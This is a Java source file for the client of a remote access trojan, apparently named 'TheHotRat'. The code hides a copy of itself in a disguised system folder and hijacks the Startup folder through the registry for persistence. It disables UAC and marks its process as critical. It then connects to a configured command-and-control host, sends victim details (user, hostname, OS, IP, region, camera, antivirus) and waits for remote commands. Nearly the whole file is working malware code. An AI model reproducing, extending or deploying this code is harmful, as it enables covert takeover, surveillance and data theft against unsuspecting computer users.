package me.client;

import com.sun.jna.Memory;
import com.sun.jna.Pointer;
import com.sun.jna.WString;
import com.sun.jna.platform.win32.*;
import me.client.filecopy.Copy;
import me.client.send.*;
import me.client.filecopy.JarUtil;
import me.client.utils.*;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import javax.swing.*;

import static com.sun.jna.platform.win32.WinBase.MUTEX_ALL_ACCESS;
import static com.sun.jna.platform.win32.WinDef.MAX_PATH;

public class Client {
    public static final String VERSION = "8";
    public static boolean isturn = false;
    public static Socket socket;
    public static InetSocketAddress inetSocketAddress;

    public static String getWindowsPath() {
        char[] chars = new char[MAX_PATH];
        LoadKernel32.instance.GetWindowsDirectoryW(chars,MAX_PATH);
        File file = new File(new String(chars).trim() + "\\SysWOW64\\WindowsSettings");
        if(!file.exists()) {
            file.mkdirs();
        }
        return file.getPath();
    }

    public static String getHead() {
        String head = "";
        String temp1 = "";
        try {
            FileInputStream fileInputStream = new FileInputStream(getWindowsPath1() + "\\WindowsConfig.ini");
            String temp = "";
            byte[] bytes = new byte[256];
            int len = 0;
            while ((len = fileInputStream.read(bytes))!=-1) {
                temp += new String(bytes,0,len);
            }
            fileInputStream.close();
            temp1 = new String(AESUtils.decrypt(temp));
            head = temp1.substring(temp1.indexOf("Head:") + 5,temp1.indexOf("password:") - 1);
        }catch (Exception e) {
            e.printStackTrace();
        }
        return head;
    }

    public static String getWindowsPath1() {
        char[] chars = new char[MAX_PATH];
        LoadKernel32.instance.GetWindowsDirectoryW(chars,MAX_PATH);
        File file = new File(new String(chars).trim() + "\\SysWOW64\\WindowsConfig");
        if(!file.exists()) {
            file.mkdirs();
        }
        return file.getPath();
    }

    public static void register(){
        File file = new File(System.getProperty("user.home") + "\\AppData\\SetUp\\360Security.ini");
        JarUtil jarUtil = new JarUtil(Client.class);
        String path = jarUtil.getJarPath() + "\\javaw.jar";
        Copy copy = new Copy(path,Client.getWindowsPath() + "\\Java(TM) Platform EE binary.jar");
        Copy copy1 = new Copy(jarUtil.getJarPath() + "\\360Security.ini",getWindowsPath1() + "\\WindowsConfig.ini");
        copy.copy();
        copy1.copy();
        Advapi32Util.registrySetExpandableStringValue(WinReg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders","Startup",getWindowsPath());
        WinDef.DWORD dword = new WinDef.DWORD(WinNT.FILE_ATTRIBUTE_HIDDEN | WinNT.FILE_ATTRIBUTE_SYSTEM | 0x00000001);
        Kernel32.INSTANCE.SetFileAttributes(getWindowsPath(),dword);
        Kernel32.INSTANCE.SetFileAttributes(getWindowsPath1(),dword);
        Kernel32.INSTANCE.SetFileAttributes(path,dword);
        file.delete();
        Advapi32Util.registrySetIntValue(WinReg.HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","EnableLUA",0x00000000);//关闭UAC提示
    }

    public static String getIP() {
        String IP = "";
        String temp1 = "";
        try {
            FileInputStream fileInputStream = new FileInputStream(getWindowsPath1() + "\\WindowsConfig.ini");
            String temp = "";
            byte[] bytes = new byte[256];
            int len = 0;
            while ((len = fileInputStream.read(bytes))!=-1) {
                temp += new String(bytes,0,len);
            }
            fileInputStream.close();
            temp1 = new String(AESUtils.decrypt(temp));
            IP = temp1.substring(temp1.indexOf("IP:") + 3,temp1.indexOf("|"));
        }catch (Exception e) {
            e.printStackTrace();
        }
        return IP;
    }

    public static int getPort() {
        String Port = "";
        int port = 0;
        try {
            FileInputStream fileInputStream = new FileInputStream(getWindowsPath1() + "\\WindowsConfig.ini");
            String temp = "";
            String temp1 = "";
            byte[] bytes = new byte[256];
            int len = 0;
            while ((len = fileInputStream.read(bytes))!=-1) {
                temp += new String(bytes,0,len);
            }
            fileInputStream.close();
            temp1 = new String(AESUtils.decrypt(temp));
            Port = temp1.substring(temp1.indexOf("Port:") + 5,temp1.indexOf("Head:")-1);
            port = Integer.parseInt(Port);
        }catch (Exception e) {
        }
        return port;
    }
    public static void relieve(){
        //解除主机
        File file = new File(getWindowsPath1() + "\\WindowsConfig.ini");
        LoadDLL.instance.RemoveProcessIsCritical();
        Advapi32Util.registrySetExpandableStringValue(WinReg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders","Startup","wowWTF");
        Advapi32Util.registrySetIntValue(WinReg.HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","EnableLUA",0x00000001);
        file.delete();
        System.exit(0);
    }
    public static void lock() {
        if(Kernel32.INSTANCE.OpenMutex(MUTEX_ALL_ACCESS,false,"TheHotRat") == null) {
            Kernel32.INSTANCE.CreateMutex(null,false,"TheHotRat");
        }else {
            Kernel32.INSTANCE.ExitProcess(0);
        }
    }
    public static void main(String[] args) throws Exception {
        UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
        lock();
        register();
        LoadDLL.instance.EnableDebugPriv();
        LoadDLL.instance.SetProcessIsCritical();
        new ShutdownChecker().start();
        inetSocketAddress = new InetSocketAddress(getIP(),getPort());
        try {
            while (!isturn) {
                con();
            }
        }catch (Exception e) {
        }
    }
    public static void con() {
        try {
            socket = new Socket();
            socket.connect(inetSocketAddress);
            isturn = true;
            JarUtil jarUtil = new JarUtil(Client.class);
            String IP = GetInternetIP.getIP();
            DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());
            dataOutputStream.writeUTF(getHead());
            dataOutputStream.writeUTF(System.getProperty("user.name"));
            dataOutputStream.writeUTF(InetAddress.getLocalHost().getHostName());
            dataOutputStream.writeUTF(System.getProperty("os.name"));
            dataOutputStream.writeUTF(IP);
            dataOutputStream.writeUTF(GetInternetIP.getRegion(IP));
            dataOutputStream.writeUTF(jarUtil.getJarName());
            dataOutputStream.writeUTF(SystemInfo.getCurrentPID());
            dataOutputStream.writeUTF(SystemInfo.camera());
            dataOutputStream.writeUTF(VERSION);
            new GetAntivirus(dataOutputStream).start();
            new SendHeartPack(socket).start();
            new ReceiveMessage(socket).start();
        }catch (Exception e) {
            isturn = false;
        }
    }

    public static void recon() {
        while (!isturn) {
            try {
                con();
            }catch (Exception e) {
            }
        }
    }
}